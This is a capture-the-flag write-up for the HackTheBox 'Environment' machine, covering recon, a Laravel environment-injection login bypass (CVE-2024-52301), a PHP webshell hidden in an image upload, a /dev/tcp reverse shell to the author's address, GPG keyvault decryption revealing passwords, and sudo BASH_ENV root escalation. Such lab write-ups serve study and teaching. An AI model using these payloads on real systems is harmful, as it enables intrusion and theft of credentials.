---
title: Environment
tags:
  - HackTheBox
  - Easy
  - Linux
  - Laravel
  - CVE
  - File-Upload
  - GPG
  - Sudo-Vulnerability
  - ENV-variables
date: 2025-05-12T00:00:05Z
---
![](Pasted%20image%2020250512203410.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.67 environment.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- environment.htb > sC.txt

[redacted]
PORT   STATE SERVICE
```

So I checked its website:

![](Pasted%20image%2020250512203813.png)

I'll perform a scan with [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://environment.htb/

[redacted]
[20:38:37] 403 -  555B  - /%2e%2e;/test                                     
[20:38:43] 403 -  555B  - /admin/.config                                    
[20:38:54] 403 -  555B  - /admpar/.ftppass                                  
[20:38:54] 403 -  555B  - /admrev/.ftppass
[20:39:00] 403 -  555B  - /bitrix/.settings.bak                             
[20:39:00] 403 -  555B  - /bitrix/.settings                                 
[20:39:00] 403 -  555B  - /bitrix/.settings.php.bak
[20:39:01] 301 -  169B  - /build  ->  http://environment.htb/build/         
[20:39:01] 403 -  555B  - /build/                                           
[20:39:15] 403 -  555B  - /ext/.deps                                        
[20:39:16] 200 -    0B  - /favicon.ico                                      
[20:39:22] 200 -    2KB - /index.php/login/                                 
[20:39:26] 403 -  555B  - /lib/flex/uploader/.project                       
[20:39:26] 403 -  555B  - /lib/flex/uploader/.actionScriptProperties
[20:39:26] 403 -  555B  - /lib/flex/uploader/.flexProperties
[20:39:26] 403 -  555B  - /lib/flex/uploader/.settings
[20:39:26] 403 -  555B  - /lib/flex/varien/.actionScriptProperties          
[20:39:26] 403 -  555B  - /lib/flex/varien/.project                         
[20:39:26] 403 -  555B  - /lib/flex/varien/.settings
[20:39:26] 403 -  555B  - /lib/flex/varien/.flexLibProperties
[20:39:27] 200 -    2KB - /login                                            
[20:39:27] 200 -    2KB - /login/                                           
[20:39:28] 302 -  358B  - /logout  ->  http://environment.htb/login         
[20:39:28] 302 -  358B  - /logout/  ->  http://environment.htb/login        
[20:39:29] 403 -  555B  - /mailer/.env                                      
[20:39:46] 403 -  555B  - /resources/.arch-internal-preview.css             
[20:39:46] 403 -  555B  - /resources/sass/.sass-cache/                      
[20:39:46] 200 -   24B  - /robots.txt                                       
[20:39:53] 301 -  169B  - /storage  ->  http://environment.htb/storage/     
[20:39:53] 403 -  555B  - /storage/
[20:39:58] 403 -  555B  - /twitter/.env                                     
[20:40:00] 405 -  245KB - /upload/                                          
[20:40:00] 405 -  245KB - /upload                                           
[20:40:01] 403 -  555B  - /vendor/
```

It outputs a `/login` endpoint:

![](Pasted%20image%2020250512204615.png)

If we capture the request with CAIDO and modify the `remember` parameter we get an error prompted:

![](Pasted%20image%2020250512205512.png)

- Note: *Laravel is being used because of the `laravel_session`*

![](Pasted%20image%2020250512205534.png)

![](Pasted%20image%2020250512205558.png)

Found Laravel version 11.30.0 and PHP 8.2.28.

## Weaponization

I searched for "Laravel 11.30 cve" and found [CVE-2024-52301](https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h) and [PoC](https://github.com/Nyamort/CVE-2024-52301)

Environment Configuration:

The .env file has APP_ENV=development, so by default, the application is set to the development environment.

```html
@production
    <p>Production environment</p>
@endproduction

@env ('local')
    <p>Local environment</p>
@endenv
```

```
**Default Access ([http://localhost](http://localhost/)):**  
Since APP_ENV is set to development and no --env argument is injected, neither the @production nor the @env('local') directive matches.  
**Result**: The output is empty.

**Injected Argument for Production ([http://localhost?--env=production](http://localhost/?--env=production)):**  
With ?--env=production in the URL, $_SERVER['argv'] is manipulated to contain ["--env=production"].  
This triggers Laravel's environment detection mechanism, setting the environment to production.  
Result: The @production directive outputs `<p>Production environment</p>`.

**Injected Argument for Local ([http://localhost?--env=local](http://localhost/?--env=local)):**  
With ?--env=local, $_SERVER['argv'] includes ["--env=local"], changing the environment to local.  
Result: The @env('local') directive outputs `<p>Local environment</p>`
```

## Exploitation

Basically, I can access the app environment without credentials by appending `--env=WHATEVER`:

![](Pasted%20image%2020250512210656.png)

There is an environment called `preprod`, so we can try to render it without credentials:

![](Pasted%20image%2020250512210823.png)

I get access to an admin panel:

![](Pasted%20image%2020250512211329.png)

Then I can upload files to change my profile picture:

![](Pasted%20image%2020250512211401.png)

I'll now test the file extension to upload. I discovered I can upload `.php.`:

![](Pasted%20image%2020250512212016.png)

Now I'll keep the magic numbers `ÿØÿà` and inside of it I'll add a basic php webshell:

![](Pasted%20image%2020250512212245.png)

Then I checked the uploaded file:

![](Pasted%20image%2020250512212635.png)

> Got RCE :D. 

Now, to get a reverse shell I'll use the following payload inside the image:

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.22/666 0>&1'"); ?>
```

![](Pasted%20image%2020250512213145.png)

Then I visit the image uploaded to get the shell:

![](Pasted%20image%2020250512213212.png)

### User flag

![](Pasted%20image%2020250512213446.png)

## Pivoting

I found a `.gpg` inside `/home/hish/backup`:

```shell
# First copy the keys to the tmp directory 
cp -r /home/hish/.gnupg /tmp/mygnupg
 
# Then set up permissions
chmod -R 700 /tmp/mygnupg
 
# Then verify the existance of the private key 
gpg --homedir /tmp/mygnupg --list-secret-keys
 
# Last, decode the keyvault.gpg
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

If we inspect the generated file:

```shell
cat /tmp/message.txt 
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

> I got credentials for ssh access: `hish:marineSPm@ster!!`

## Privilege Escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
env_keep+="ENV BASH_ENV"
[redacted]
(ALL) /usr/bin/systeminfo
```

As `sudo`  enables to keep the variable `ENV BASH_ENV` I can use this if the binary is non-interactive. So I checked the content of the binary:

```bash
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

As it is a non-interactive binary I can create a bash environment variable that points to an executable to execute it at the beginning of the binary:

```shell
echo 'bash -p' > /tmp/example.sh
chmod +x /tmp/example.sh
sudo BASH_ENV=/tmp/exp.sh /usr/bin/systeminfo
```

### Root flag

![](Pasted%20image%2020250512220100.png)

==Machine pwned!==